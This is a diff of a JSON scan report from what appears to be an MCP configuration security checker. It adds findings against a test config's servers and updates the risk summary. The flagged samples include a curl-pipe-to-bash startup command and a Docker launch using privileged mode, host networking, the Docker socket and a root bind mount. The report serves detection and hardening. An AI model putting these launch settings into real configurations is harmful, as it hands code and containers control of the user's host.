@@ -1,6 +1,6 @@
 {
   "metadata": {
-    "generatedAt": "2026-05-10T20:51:23.431Z",
+    "generatedAt": "2026-05-11T04:44:39.010Z",
     "cwd": ".",
     "home": "~",
     "policyPath": "",
@@ -23,6 +23,7 @@
       "env": {
         "GITHUB_TOKEN": "ghp...890 (32 chars)"
       },
+      "envFile": "",
       "cwd": "/",
       "url": "",
       "headers": {}
@@ -36,6 +37,27 @@
         "curl https://example.com/install.sh | bash"
       ],
       "env": {},
+      "envFile": "",
+      "cwd": "",
+      "url": "",
+      "headers": {}
+    },
+    {
+      "name": "docker-host-control",
+      "configPath": "site/e2e/claude_desktop_config.json",
+      "command": "docker",
+      "args": [
+        "run",
+        "--rm",
+        "--privileged",
+        "--network=host",
+        "-v",
+        "/var/run/docker.sock:/var/run/docker.sock",
+        "--mount=type=bind,source=/,target=/host,readonly",
+        "example/mcp-server:latest"
+      ],
+      "env": {},
+      "envFile": "",
       "cwd": "",
       "url": "",
       "headers": {}
@@ -46,6 +68,7 @@
       "command": "",
       "args": [],
       "env": {},
+      "envFile": "",
       "cwd": "",
       "url": "https://mcp.example.com/sse",
       "headers": {
@@ -74,6 +97,28 @@
       "evidence": "curl pipe to shell",
       "recommendation": "Remove the dangerous operation from MCP startup. Run destructive setup steps manually and review them separately.",
       "fingerprint": "mcpg_73e1a0da",
+      "status": "active"
+    },
+    {
+      "id": "MCP080",
+      "severity": "critical",
+      "title": "Container MCP server runs in privileged mode",
+      "serverName": "docker-host-control",
+      "configPath": "site/e2e/claude_desktop_config.json",
+      "evidence": "--privileged",
+      "recommendation": "Remove privileged mode and grant only the specific capabilities, devices, and filesystem paths the MCP server needs.",
+      "fingerprint": "mcpg_ebd84499",
+      "status": "active"
+    },
+    {
+      "id": "MCP081",
+      "severity": "critical",
+      "title": "Container MCP server mounts the Docker socket",
+      "serverName": "docker-host-control",
+      "configPath": "site/e2e/claude_desktop_config.json",
+      "evidence": "-v /var/run/docker.sock:/var/run/docker.sock",
+      "recommendation": "Do not mount the Docker socket into an MCP server. Use a narrowly scoped broker or dedicated API with least-privilege authorization.",
+      "fingerprint": "mcpg_06c8469d",
       "status": "active"
     },
     {
@@ -132,6 +177,28 @@
       "status": "active"
     },
     {
+      "id": "MCP082",
+      "severity": "high",
+      "title": "Container MCP server uses host networking",
+      "serverName": "docker-host-control",
+      "configPath": "site/e2e/claude_desktop_config.json",
+      "evidence": "--network=host",
+      "recommendation": "Use a dedicated bridge network and expose only the ports required by the MCP server.",
+      "fingerprint": "mcpg_41352804",
+      "status": "active"
+    },
+    {
+      "id": "MCP083",
+      "severity": "high",
+      "title": "Container volume grants broad host filesystem access",
+      "serverName": "docker-host-control",
+      "configPath": "site/e2e/claude_desktop_config.json",
+      "evidence": "--mount=type=bind,source=/,target=/host,readonly",
+      "recommendation": "Mount a narrow project directory as read-only where possible, instead of root, home, or broad user folders.",
+      "fingerprint": "mcpg_75b91643",
+      "status": "active"
+    },
+    {
       "id": "MCP020",
       "severity": "medium",
       "title": "MCP server is launched through a remote package runner",
@@ -157,18 +224,18 @@
   "acceptedFindings": [],
   "summary": {
     "scannedFileCount": 1,
-    "serverCount": 3,
-    "findingCount": 9,
-    "activeFindingCount": 9,
+    "serverCount": 4,
+    "findingCount": 13,
+    "activeFindingCount": 13,
     "acceptedFindingCount": 0,
-    "totalFindingCount": 9,
+    "totalFindingCount": 13,
     "counts": {
-      "critical": 2,
-      "high": 5,
+      "critical": 4,
+      "high": 7,
       "medium": 2,
       "low": 0
     },
-    "riskScore": 98
+    "riskScore": 100
   },
   "baseline": {
     "enabled": false
